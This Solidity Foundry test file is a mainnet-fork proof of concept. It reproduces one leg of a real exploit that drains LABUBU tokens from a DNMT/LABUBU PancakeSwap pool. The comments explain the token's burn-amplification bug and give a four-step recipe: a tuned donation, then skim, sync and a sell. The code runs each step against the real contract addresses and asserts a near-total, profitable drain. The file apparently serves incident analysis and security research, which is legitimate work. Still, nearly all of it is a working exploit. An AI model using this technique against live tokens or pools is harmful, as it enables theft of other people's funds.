// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Fork PoC - reproduces ONE leg of the real LABUBU drain exploit.
//
// Real exploit tx: 0x53da6339ad5b4bd965903a2cb9b676c57119aae9b97b35fd9425e465427c90ed
//   block 102,551,812 ; ~907,879 LABUBU drained across 5 pools in one tx.
// This leg: DNMTToken 0x531fd3f858dbf5c93fb900c6b78a55edb8777999 / LABUBU pool
//   0x1829f778b883383356c43210ac482feb7f893b80 (token0=LABUBU, token1=DNMT).
//
// ROOT CAUSE (verified against live state at block 102551811):
//   DNMTToken._update BUY branch (from == swapPair) does
//       super._update(from, BURN_ADDRESS, value * decimalsValue);  value = 0;
//   When the PAIR sends out value DNMT it instead BURNS value*decimalsValue from the pair and
//   the receiver gets 0. decimalsValue is NOT 1 here - live it is 7326680472586200649
//   (~7.327e18). So forcing the pair to send out a tiny value of DNMT burns value*7.327e18
//   DNMT from the pool for free.
//
// WEAPON (from the on-chain log order, NOT a flash-swap / sync-in-callback):
//   This PancakePair is 100% standard: swap() and sync() are both lock-guarded and the swap
//   K-check rejects a burn-without-input, so flash-swap + sync-in-callback is IMPOSSIBLE here.
//   The attacker used the K-check-free skim() path:
//     1. Donate a tuned tiny amount of DNMT so excess = reserve1/decimalsValue (modeled via
//        deal on the pair balance; on-chain a ~1.464e9 wei DNMT transfer, after 15% sell tax,
//        landed the exact net excess of 1128466337 wei).
//     2. PAIR.skim(attacker): pair sends excess DNMT to attacker -> BUY branch burns
//        excess*decimalsValue = ~the ENTIRE pool DNMT; attacker gets 0. No K-check, no sync.
//     3. PAIR.sync(): bakes the collapsed DNMT balance into reserves (reserve1 -> ~1.722 DNMT).
//     4. Sell pre-held DNMT ammo into the DNMT-starved pool (fee-on-transfer) -> take the LABUBU.
//
// Note: tokenAddress() (symbol IB, 0xe2cec478...) returns balanceOf == 1 for every address, so
// the _update price hook (currentPrice / balanceOf(tokenAddress, from)) never divides by zero -
// no setup needed for it.

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address a) external view returns (uint256);
    function approve(address s, uint256 v) external returns (bool);
    function transfer(address to, uint256 v) external returns (bool);
}
interface IDNMT is IERC20 {
    function decimalsValue() external view returns (uint256);
    function tokenAddress() external view returns (address);
    function isUpdateHourlyLow() external view returns (bool);
}
interface IPair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function skim(address to) external;
    function sync() external;
}
interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) external;
}

contract LabubuDecimalsValueBurnPoC is Test {
    IDNMT  constant DNMT   = IDNMT(0x531fd3F858DbF5c93fb900C6B78a55eDB8777999);
    IERC20 constant LABUBU = IERC20(0x3494dfE19b721DAC6c5c8d7470c8F89548177777);
    IPair  constant PAIR   = IPair(0x1829F778B883383356c43210Ac482FeB7f893B80);
    IRouter constant ROUTER= IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant DEAD  = 0x000000000000000000000000000000000000dEaD;

    uint256 constant AMMO_DNMT = 621712298265229568342; // real attacker pre-exploit DNMT balance

    uint256 labubuBefore;
    uint256 dnmtBefore;
    uint256 dv;

    function _reserves() internal view returns (uint256 labubu, uint256 dnmt) {
        (uint112 r0, uint112 r1,) = PAIR.getReserves();
        labubu = uint256(r0);
        dnmt = uint256(r1);
    }

    function test_decimalsValue_burn_skim_sync_drains_labubu() public {
        require(PAIR.token0() == address(LABUBU), "token0 != LABUBU");
        (labubuBefore, dnmtBefore) = _reserves();
        dv = DNMT.decimalsValue();
        emit log_named_uint("decimalsValue (burn amplifier)", dv);
        emit log_named_uint("pool LABUBU reserve (pre)", labubuBefore / 1e18);
        emit log_named_uint("pool DNMT reserve (pre, whole tokens)", dnmtBefore / 1e18);
        require(dv > 1e18, "decimalsValue not amplified");
        require(DNMT.isUpdateHourlyLow(), "hourly-low off");

        _collapse();
        _extractAndAssert();
    }

    function _collapse() internal {
        deal(address(DNMT), address(this), AMMO_DNMT);

        // STEP 1: create the skim-able excess (models the tuned DNMT donation)
        uint256 pairDnmt = DNMT.balanceOf(address(PAIR)); // == reserve1 (synced)
        uint256 T = pairDnmt / dv;                         // = 1128466337
        emit log_named_uint("skim excess T (wei DNMT)", T);
        emit log_named_uint("amplified burn T*decimalsValue (wei DNMT)", T * dv);
        deal(address(DNMT), address(PAIR), pairDnmt + T);

        // STEP 2: skim -> pair sends T out -> BUY branch burns T*dv from the pair
        uint256 deadBefore = DNMT.balanceOf(DEAD);
        PAIR.skim(address(this));
        emit log_named_uint("DNMT burned from pool via skim (wei)", DNMT.balanceOf(DEAD) - deadBefore);
        assertEq(DNMT.balanceOf(address(this)), AMMO_DNMT, "attacker must receive 0 DNMT from skim");

        // STEP 3: sync -> bake the collapsed DNMT balance into reserves
        PAIR.sync();
        (uint256 lm, uint256 dm) = _reserves();
        emit log_named_uint("pool LABUBU reserve (post skim+sync)", lm / 1e18);
        emit log_named_uint("pool DNMT reserve (post skim+sync, wei)", dm);
        assertLt(dm, 10 ether, "DNMT reserve should be collapsed to dust");
    }

    function _extractAndAssert() internal {
        // STEP 4: sell DNMT ammo into the DNMT-starved pool -> drain LABUBU
        DNMT.approve(address(ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(DNMT);
        path[1] = address(LABUBU);
        uint256 start = LABUBU.balanceOf(address(this));
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            DNMT.balanceOf(address(this)), 0, path, address(this), block.timestamp + 3600
        );
        uint256 gained = LABUBU.balanceOf(address(this)) - start;

        (uint256 labubuAfter,) = _reserves();
        emit log_named_uint("LABUBU extracted by attacker (whole tokens)", gained / 1e18);
        emit log_named_uint("pool LABUBU reserve (final)", labubuAfter / 1e18);
        emit log_named_uint("pool LABUBU drained percent", (100 * (labubuBefore - labubuAfter)) / labubuBefore);

        uint256 ammoValueInLabubu = (AMMO_DNMT * labubuBefore) / dnmtBefore;
        emit log_named_uint("ammo honest value in LABUBU (pre-attack)", ammoValueInLabubu);
        assertGt(gained, ammoValueInLabubu * 1000, "not a profitable drain");
        assertGt(gained, 130_000 ether, "expected near-total LABUBU extraction");
    }
}
